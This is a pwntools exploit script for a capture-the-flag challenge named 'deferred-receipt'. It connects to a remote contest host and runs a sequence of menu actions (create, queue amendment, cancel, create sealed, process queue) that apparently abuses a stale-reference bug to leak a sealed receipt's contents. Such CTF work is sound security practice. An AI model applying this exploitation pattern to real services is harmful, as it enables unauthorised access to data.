from pwn import *

elf = context.binary = ELF('./deferred-receipt')
# p = process()
p = remote('deferred-receipt.wolvctf-2026.kctf.cloud', 1337)

def create():
    p.sendlineafter('Choice: ', '1')
    p.recvuntil('Receipt ID: ')
    return int(p.recvline().strip())

def queue_amendment(pub_id):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('Public receipt ID: ', str(pub_id).encode())
    p.sendlineafter('Amendment (hex): ', '4c414553')

def cancel(pub_id):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('Public receipt ID: ', str(pub_id).encode())

def create_sealed():
    p.sendlineafter('Choice: ', '4')
    p.recvuntil('Receipt ID: ')
    return int(p.recvline().strip())

def process_queue():
    p.sendlineafter('Choice: ', '5')

def export(sealed_id):
    p.sendlineafter('Choice: ', '6')
    p.sendlineafter('Sealed receipt ID: ', str(sealed_id).encode())
    data = p.recvuntil('Choice: ', timeout=3)
    print(data.decode(errors='replace'))
    return data

pub = create()
log.info(f'public id = {pub}')

queue_amendment(pub)
cancel(pub)

sealed = create_sealed()
log.info(f'sealed id = {sealed}')

process_queue()
export(sealed)

p.sendline(b'7')
p.close()